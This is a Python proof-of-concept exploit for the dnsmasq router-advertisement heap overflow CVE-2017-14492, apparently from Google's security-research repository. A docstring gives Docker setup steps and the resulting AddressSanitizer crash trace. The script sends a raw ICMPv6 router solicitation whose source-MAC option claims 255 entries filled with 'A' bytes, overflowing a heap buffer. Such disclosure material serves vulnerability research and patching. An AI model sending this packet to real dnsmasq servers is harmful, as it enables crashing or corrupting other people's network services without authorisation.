'''
Sources:
https://raw.githubusercontent.com/google/security-research-pocs/master/vulnerabilities/dnsmasq/CVE-2017-14492.py
https://security.googleblog.com/2017/10/behind-masq-yet-more-dns-and-dhcp.html

1) Build the docker and open two terminals

docker build -t dnsmasq .
docker run --rm -t -i --name dnsmasq_test dnsmasq bash
docker cp poc.py dnsmasq_test:/poc.py
docker exec -it <container_id> bash

2) On one terminal start dnsmasq:

# /test/dnsmasq_noasn/src/dnsmasq --no-daemon --dhcp-range=fd00::2,fd00::ff --enable-ra
dnsmasq: started, version 2.78test2-8-ga3303e1 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt no-DBus no-i18n no-IDN DHCP DHCPv6 no-Lua TFTP no-conntrack ipset auth no-DNSSEC loop-detect inotify
dnsmasq-dhcp: DHCPv6, IP range fd00::2 -- fd00::ff, lease time 1h
dnsmasq-dhcp: router advertisement on fd00::
dnsmasq-dhcp: IPv6 router advertisement enabled
dnsmasq: reading /etc/resolv.conf
dnsmasq: using nameserver 8.8.8.8#53
dnsmasq: using nameserver 8.8.4.4#53
dnsmasq: read /etc/hosts - 7 addresses


3) On another terminal start the PoC:

# python /poc.py ::1 547
[+] sending 2050 bytes to ::1

4) Dnsmasq will output the following: Segmentation fault (core dumped)

==556==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61900000ea81 at pc 0x00000049628a bp 0x7ffd60a28a20 sp 0x7ffd60a281d0
WRITE of size 4 at 0x61900000ea81 thread T0
    #0 0x496289 in __interceptor_vsprintf (/test/dnsmasq/src/dnsmasq+0x496289)
    #1 0x4964d2 in __interceptor_sprintf (/test/dnsmasq/src/dnsmasq+0x4964d2)
    #2 0x519538 in print_mac /test/dnsmasq/src/util.c:593:12
    #3 0x586e6a in icmp6_packet /test/dnsmasq/src/radv.c:201:4
    #4 0x544af4 in main /test/dnsmasq/src/dnsmasq.c:1064:2
    #5 0x7f0d52e312b0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202b0)
    #6 0x41cbe9 in _start (/test/dnsmasq/src/dnsmasq+0x41cbe9)

0x61900000ea81 is located 0 bytes to the right of 1025-byte region [0x61900000e680,0x61900000ea81)
allocated by thread T0 here:
    #0 0x4cc700 in calloc (/test/dnsmasq/src/dnsmasq+0x4cc700)
    #1 0x5181b5 in safe_malloc /test/dnsmasq/src/util.c:267:15
    #2 0x51cb14 in read_opts /test/dnsmasq/src/option.c:4615:16
    #3 0x541783 in main /test/dnsmasq/src/dnsmasq.c:89:3
    #4 0x7f0d52e312b0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202b0)

SUMMARY: AddressSanitizer: heap-buffer-overflow (/test/dnsmasq/src/dnsmasq+0x496289) in __interceptor_vsprintf
Shadow bytes around the buggy address:
  0x0c327fff9d00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c327fff9d10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c327fff9d20: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c327fff9d30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c327fff9d40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0c327fff9d50:[01]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c327fff9d60: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c327fff9d70: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c327fff9d80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c327fff9d90: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c327fff9da0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==556==ABORTING
'''

#!/usr/bin/env python
#
# Copyright 2017 Google Inc
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Authors:
#  Fermin J. Serna <fjserna@google.com>
#  Felix Wilhelm <fwilhelm@google.com>
#  Gabriel Campana <gbrl@google.com>
#  Kevin Hamacher <hamacher@google.com>
#  Gynvael Coldwind <gynvael@google.com>
#  Ron Bowes - Xoogler :/

from struct import pack
import socket
import sys

ND_ROUTER_SOLICIT = 133
ICMP6_OPT_SOURCE_MAC = 1

def u8(x):
    return pack("B", x)

def send_packet(data, host):
    print("[+] sending {} bytes to {}".format(len(data), host))
    s = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_ICMPV6)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, len(data))

    if s.sendto(data, (host, 0)) != len(data):
        print("[!] Could not send (full) payload")
    s.close()

if __name__ == '__main__':
    assert len(sys.argv) == 2, "Run via {} <IPv6>".format(sys.argv[0])
    host, = sys.argv[1:]
    pkg = b"".join([
        u8(ND_ROUTER_SOLICIT),    # type
        u8(0),                    # code
        b"X" * 2,                 # checksum
        b"\x00" * 4,              # reserved
        u8(ICMP6_OPT_SOURCE_MAC), # hey there, have our mac
        u8(255),                  # Have 255 MACs!
        b"A" * 255 * 8,
    ])

    send_packet(pkg, host)